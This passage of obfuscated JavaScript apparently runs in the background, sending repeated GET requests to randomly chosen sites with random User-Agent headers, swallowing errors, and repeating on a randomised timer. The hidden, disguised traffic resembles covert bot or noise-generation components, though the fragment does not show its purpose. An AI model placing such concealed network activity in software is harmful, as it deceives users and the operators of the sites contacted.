  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    const a4 = c;
    f['get'](miscSites[a4(0x9)](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xce2 * 0x3 + -0x42 * -0x50 + -0x16af * -0x2) * getRandomInt(-0x1d04 + 0x8f1 + 0x505 * 0x4, 0x2 * -0xfce + 0x1d90 * 0x1 + -0x1 * -0x211));
}, -0x12e0 + 0x11bd + 0x17 * 0x11);